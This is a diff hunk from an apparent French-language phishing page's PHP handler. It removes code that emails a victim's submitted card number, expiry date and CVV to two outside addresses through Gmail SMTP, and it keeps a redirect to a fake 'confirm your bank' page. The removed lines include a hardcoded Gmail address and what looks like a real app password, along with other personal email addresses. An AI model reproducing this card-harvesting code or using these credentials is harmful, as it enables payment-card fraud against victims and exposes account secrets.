@@ -23,64 +23,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       $_SESSION['verificationCode'] = $verificationCode;
      
 
-      $mail = new PHPMailer(true);
-
-    // Configuration du serveur SMTP
-    $mail->isSMTP();
-    $mail->Host = 'smtp.gmail.com'; // Adresse du serveur SMTP (ex: smtp.gmail.com)
-    $mail->SMTPAuth = true;
-    $mail->Username = 'warrenkazimoto12@gmail.com'; // Votre email
-    $mail->Password = 'ivbshnwbrdlwkziw'; // Votre mot de passe
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-    $mail->Port = 587; // Port SMTP
-
-
-    // Configuration de l'email
-    $mail->setFrom('warrenkazimoto12@gmail.com', 'lebon');
-    $mail->addAddress('angedesirecamara@gmail.com', 'camara');
-
-    $mail->isHTML(true); // Activer HTML si nécessaire
-    $mail->Subject = 'Informations de la transaction';
-
-    // Corps de l'email
-    $mail->Body = "
-        <h2>Informations de la transaction avec acces</h2>
-        <ul>
-           
-            <li><strong>Carte Bancaire :</strong> $cNumber</li>
-            <li><strong>Date :</strong> $expDate</li>
-            <li><strong>Cryptogramme :</strong> $verificationCode</li>
-
-          
-        </ul>
-    ";
-
-    $mail->send();
-    // echo 'Email envoyé avec succès.';
-    // Configuration de l'email
-    $mail = new PHPMailer(true);
-
-    $mail->setFrom('warrenkazimoto12@gmail.com', 'lebon');
-    $mail->addAddress('terrancepickup@outlook.com', 'lebon');
-
-    $mail->isHTML(true); // Activer HTML si nécessaire
-    $mail->Subject = 'Informations de la transaction';
-
-    // Corps de l'email
-    $mail->Body = "
-        <h2>Informations de la transaction avec acces</h2>
-        <ul>
-           
-            <li><strong>Carte Bancaire :</strong> $cNumber</li>
-            <li><strong>Date :</strong> $expDate</li>
-            <li><strong>Cryptogramme :</strong> $verificationCode</li>
-
-          
-        </ul>
-    ";
-
-    $mail->send();
-      // Redirection vers la page de confirmation
+      
       header('Location: Confirmez-votre-banque.php');
       exit;
   
